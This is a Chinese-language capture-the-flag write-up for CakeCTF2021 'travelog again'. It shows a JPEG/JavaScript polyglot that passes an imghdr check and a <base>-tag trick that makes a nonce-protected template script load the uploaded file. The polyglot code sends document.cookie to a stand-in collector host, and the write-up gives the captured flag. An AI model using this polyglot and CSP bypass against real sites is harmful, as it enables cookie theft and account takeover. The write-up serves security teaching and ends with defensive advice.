# CakeCTF2021 travelog again

## 题目简述

本题沿用 `travelog` 的文章、上传、CSP 和举报逻辑，但 bot 不再把 flag 放在 User-Agent，而是设置一个非 HttpOnly 的同源 `flag` Cookie。单纯让 bot 跳转只能看到普通 User-Agent，必须在目标源上下文执行 JavaScript 并读取 `document.cookie`。

## 解题过程

### 制作同时通过 JPEG 和 JavaScript 解析的文件

上传接口使用 Python `imghdr.what()`，JPEG 检查会观察偏移 6 到 9 的 `JFIF`。构造文件：

```javascript
nyan/*JFIF*/=1;
location.href="https://collector.example/?cookie="+
              encodeURIComponent(document.cookie);
```

前六字节是 `nyan/*`，随后正好出现 `JFIF`。浏览器按 JavaScript 加载时，`/*JFIF*/` 是注释，剩余代码把 Cookie 编码后送到自有收集端。文件名必须为 `show_utils.js`，MIME 声明并不能替代实际字节检查。

### 用 base 标签重定向模板脚本

登录后可从 Flask Session 中取得自己的 `user_id`，把 polyglot 上传到：

```text
/uploads/<user_id>/show_utils.js
```

文章正文写入：

```html
<base href="/uploads/<user_id>/XXX/YYY/">
```

模板自带的相对引用 `../../show_utils.js` 因此解析到攻击者上传文件。`<base>` 仍是同源地址，满足 `base-uri 'self'`；模板脚本标签上的随机 nonce 又授权了这个外部脚本，所以 CSP 不会阻止执行。

### 举报文章并读取 Cookie

将文章路径提交给举报接口。bot 先为 `challenge` 源设置 `flag` Cookie，再访问文章。polyglot 在该源中运行，`document.cookie` 能读取它，因为 Cookie 明确设置为 `httpOnly: false`。收集端收到：

```text
flag=CakeCTF{I'll_n3v3r_trust_HTML:angry:}
```

正文已经给出 polyglot、路径解析、CSP 通过原因和 Cookie 属性，复现不依赖任何已失效的第三方收集链接。

## 方法总结

- flag 从 User-Agent 移到 Cookie 后，攻击目标从“制造导航”升级为“取得同源脚本执行”。
- nonce 保护的是具体脚本标签；如果攻击者能通过 `<base>` 改写该标签的相对 `src`，合法 nonce 也会授权恶意资源。
- 敏感 Cookie 应设置 HttpOnly，并且用户 HTML 不能只依赖 CSP 防护，仍需可靠清洗或隔离源。
